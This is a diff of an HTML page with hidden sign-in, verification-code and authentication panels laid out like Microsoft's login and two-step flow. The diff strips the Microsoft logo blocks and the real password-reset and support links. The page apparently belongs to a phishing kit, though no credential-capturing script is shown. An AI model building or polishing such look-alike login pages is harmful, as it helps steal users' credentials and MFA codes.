@@ -191,7 +191,7 @@
     <meta name="LocLC" content="en-US" />
     <meta name="format-detection" content="telephone=no" />
     <style>
-      .win-scroll {
+      .scroll {
         font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue",
           "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi",
           "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI",
@@ -214,18 +214,8 @@
     />
   </head>
   <body data-app="@dxp/commerce-web@0.30.0">
-    <div
-      id="page-spinner"
-      style="
-        display: flex;
-        justify-content: center;
-        align-items: center;
-      "
-    >
-      <div
-        class="fa fa-spinner fa-spin"
-        style="font-size: 40px; margin-top: 45vh"
-      ></div>
+    <div id="page-spinner" style="display: flex; justify-content: center; align-items: center">
+      <div class="fa fa-spinner fa-spin" style="font-size: 40px; margin-top: 45vh;"></div>
     </div>
     <div id="page-content" style="display: none">
       <div id="__next" data-reactroot="">
@@ -2150,7 +2140,7 @@
           <!-- Content start -->
           <div
             id="loader"
-            class="win-scroll"
+            class="scroll"
             style="
               margin-left: auto;
               margin-right: auto;
@@ -2172,53 +2162,7 @@
             "
           >
             <div>
-              <div class="w3-row">
-                <div class="w3-col" style="width: fit-content;">
-                  <div class="w3-row" style="width: fit-content">
-                    <div class="w3-col s6">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(241, 81, 27);
-                        "
-                      ></div>
-                    </div>
-                    <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(127, 186, 0);
-                        "
-                      ></div>
-                    </div>
-                  </div>
-                  <div class="w3-row" style="width: fit-content">
-                    <div class="w3-col s6">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(0, 164, 239);
-                        "
-                      ></div>
-                    </div>
-                    <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(255, 185, 0);
-                        "
-                      ></div>
-                    </div>
-                  </div>
-                </div>
-                <div class="w3-col" style="width: fit-content; padding-left: 4px; font-size: 20;">
-                  <span style="font-weight: 600;color: rgb(115, 115, 115); font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; font-size: 20px; ">Microsoft</span>
-                </div>
-              </div>
+              
             </div>
 
             <div style="margin: 32px 0px">
@@ -2249,7 +2193,7 @@
           </div>
           <div
             id="sign-in"
-            class="win-scroll"
+            class="scroll"
             style="
               margin-left: auto;
               margin-right: auto;
@@ -2282,53 +2226,6 @@
             </div>
             <div style="padding: 44px">
               <div>
-                <div class="w3-row">
-                  <div class="w3-col" style="width: fit-content;">
-                    <div class="w3-row" style="width: fit-content">
-                      <div class="w3-col s6">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(241, 81, 27);
-                          "
-                        ></div>
-                      </div>
-                      <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(127, 186, 0);
-                          "
-                        ></div>
-                      </div>
-                    </div>
-                    <div class="w3-row" style="width: fit-content">
-                      <div class="w3-col s6">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(0, 164, 239);
-                          "
-                        ></div>
-                      </div>
-                      <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(255, 185, 0);
-                          "
-                        ></div>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="w3-col" style="width: fit-content; padding-left: 4px; font-size: 20;">
-                    <span style="font-weight: 600;color: rgb(115, 115, 115); font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; font-size: 20px; ">Microsoft</span>
-                  </div>
-                </div>
                 
               </div>
               <div style="margin: 16px 0px; height: 26px">
@@ -2394,16 +2291,7 @@
                 />
               </div>
               <div style="margin: 12px 0px 4px">
-                <a
-                  style="
-                    color: #0067b8;
-                    font-size: 0.8125rem;
-                    font-weight: 400;
-                    line-height: 1.25rem;
-                  "
-                  href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQQIARAAhZLPi-NkHMabdqYzU9QdVpHd9TKIB7G2fZukeduBBZt2pm3aJG2TTJtcQiZJm6T51eRtm-Yv8LgnD4M_wIPInGQPIoKyeBCZ0-LBlT16XEQWEdnLgrN6Xrw8PA_Pw_fy_RT2YJkoV8vgvRxeBsfvkJCqkWTtvETgOlUiG-egVCdMqlQ1GsR1hUNK16KbhcMO_fT5HXD_5NPsLz9-eefjXy-xIwuhMD6uVDabTTmYzWzdLOuBV3E137D9-Rr_BsMeYthFdtf0S5JwmY0pol6r1gBeJUgKwAasVcuyyG641LX49hzxIu0qAgDKhPMGE8bjJjJiHXbLpk2SF6WEbVsWiysLzpnXOFFCfOfM4lsA8KJODkRrwYtNxKVj9_oWkFMdyPiIeJy9wTdXyMJfSBDZqfln9mAWRJ4aBjG6yH2U9SNFrDF9oSMbrj9a2mavKwxXjbVDLQdh1400Hp6OcNhyCbqLpG0wkZazUzScGYretrugq3VMPIYRpJUuJ5ICI6nDUOh4ihTKKiVLiscvSsQwmpZOnc5aYO3FWX923uujRkOcDZExPUsGflCnQKnFsxwjEORYMNCoz3YQ37JUV_NoxmVTPGJh3ZiSNNIdyIMzecIu6ywNKSuhJ_RGoihqFCJXiFXVIy3NHoiJ4i_gmOptXW6L5mN1HDYX8mibutGYMmlzqfNs20lEPcQVnzmxtj0pDpiq1E5mKQ_ml7nbL3nvGr-fy18bL_CvcjAITd82jsIomNmu-TIk1niF_zd1A88sN133t9xt29cMx7Q-sH0_WGvIXpuGFb9YP9zBnuy8ub93mLuFHWXefQPkjvf3C4eZW5mjzLMd7PPdaxovH_3-1_c_f938An_r7e8ai8zVbgUWGWbVGwOz15H9JCluhBai-8W5s6S4rRyLrjiNtXoIA8jeBcfVe3nsXj5_lT_otVXuRKRU8DSf_XAv8-3B_3L9-JXXC4WVrbqBrrlmfPM_vh-8mnn22k8Xn_3w94NP_ug-ufE-HEzrRV2juj2DMIqhNXFWlWo7DcjUgBETIt_D4aSykJnk5O5Xh5l_AA2&mkt=en-US&hosted=0&device_platform=Windows+10"
-                  >Forgot my password</a
-                >
+               
               </div>
               <div style="display: flex; justify-content: right">
                 <div
@@ -2427,7 +2315,7 @@
           </div>
           <div
             id="enter-code"
-            class="win-scroll"
+            class="scroll"
             style="
               margin-left: auto;
               margin-right: auto;
@@ -2461,53 +2349,7 @@
             </div>
             <div style="padding: 44px">
               <div>
-                <div class="w3-row">
-                  <div class="w3-col" style="width: fit-content;">
-                    <div class="w3-row" style="width: fit-content">
-                      <div class="w3-col s6">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(241, 81, 27);
-                          "
-                        ></div>
-                      </div>
-                      <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(127, 186, 0);
-                          "
-                        ></div>
-                      </div>
-                    </div>
-                    <div class="w3-row" style="width: fit-content">
-                      <div class="w3-col s6">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(0, 164, 239);
-                          "
-                        ></div>
-                      </div>
-                      <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                        <div
-                          style="
-                            height: 11px;
-                            width: 11px;
-                            background-color: rgb(255, 185, 0);
-                          "
-                        ></div>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="w3-col" style="width: fit-content; padding-left: 4px; font-size: 20;">
-                    <span style="font-weight: 600;color: rgb(115, 115, 115); font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; font-size: 20px; ">Microsoft</span>
-                  </div>
-                </div>
+                
               </div>
               <div style="margin: 16px 0px; height: 20px">
                 <span
@@ -2576,16 +2418,7 @@
                 />
               </div>
               <div style="margin: 12px 0px 4px">
-                <a
-                  style="
-                    color: #0067b8;
-                    font-size: 0.8125rem;
-                    font-weight: 400;
-                    line-height: 1.25rem;
-                  "
-                  href="https://support.microsoft.com/en-us/account-billing/common-problems-with-two-step-verification-for-a-work-or-school-account-63acbb9b-16a1-47b9-8619-6a865e8071a5"
-                  >More information</a
-                >
+               
               </div>
               <div style="display: flex; justify-content: right">
                 <div
@@ -2626,7 +2459,7 @@
           </div>
           <div
             id="authenticate"
-            class="win-scroll"
+            class="scroll"
             style="
               margin-left: auto;
               margin-right: auto;
@@ -2649,53 +2482,7 @@
             "
           >
             <div>
-              <div class="w3-row">
-                <div class="w3-col" style="width: fit-content;">
-                  <div class="w3-row" style="width: fit-content">
-                    <div class="w3-col s6">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(241, 81, 27);
-                        "
-                      ></div>
-                    </div>
-                    <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(127, 186, 0);
-                        "
-                      ></div>
-                    </div>
-                  </div>
-                  <div class="w3-row" style="width: fit-content">
-                    <div class="w3-col s6">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(0, 164, 239);
-                        "
-                      ></div>
-                    </div>
-                    <div class="w3-col s6" style="padding: 0px 0px .5px .5px">
-                      <div
-                        style="
-                          height: 11px;
-                          width: 11px;
-                          background-color: rgb(255, 185, 0);
-                        "
-                      ></div>
-                    </div>
-                  </div>
-                </div>
-                <div class="w3-col" style="width: fit-content; padding-left: 4px; font-size: 20;">
-                  <span style="font-weight: 600;color: rgb(115, 115, 115); font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; font-size: 20px; ">Microsoft</span>
-                </div>
-              </div>
+              
             </div>
             <div style="margin: 16px 0px; height: 20px">
               <span
@@ -2768,16 +2555,7 @@
               >
             </div>
             <div style="margin: 12px 0px 4px">
-              <a
-                style="
-                  color: #0067b8;
-                  font-size: 0.8125rem;
-                  font-weight: 400;
-                  line-height: 1.25rem;
-                "
-                href="https://support.microsoft.com/en-us/account-billing/common-problems-with-two-step-verification-for-a-work-or-school-account-63acbb9b-16a1-47b9-8619-6a865e8071a5"
-                >More information</a
-              >
+              
             </div>
           </div>
         </div>
